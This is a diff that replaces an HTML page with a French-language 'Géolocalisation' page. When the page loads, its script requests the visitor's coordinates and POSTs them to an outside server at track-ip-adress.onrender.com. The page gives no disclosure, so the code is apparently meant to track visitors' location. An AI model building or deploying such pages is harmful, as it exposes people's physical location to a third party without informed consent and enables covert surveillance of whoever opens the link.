@@ -20,7 +20,7 @@
 </body>
 </html> -->
 
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -40,5 +40,49 @@
       });
   </script>
 </body>
+</html> -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Géolocalisation</title>
+</head>
+<body>
+    <script>
+        function sendLocation(position) {
+            // Envoie les coordonnées à ton serveur
+            fetch('https://track-ip-adress.onrender.com/api/location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude
+                })
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Coordonnées envoyées avec succès');
+                } else {
+                    console.error('Erreur lors de l\'envoi des coordonnées:', response.statusText);
+                }
+            }).catch(error => {
+                console.error('Erreur lors de l\'envoi des coordonnées', error);
+            });
+        }
+
+        function handleGeolocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, error => {
+                    console.error('Erreur de géolocalisation', error);
+                });
+            } else {
+                console.error('La géolocalisation n\'est pas supportée par ce navigateur.');
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', handleGeolocation);
+    </script>
+</body>
 </html>
+
 
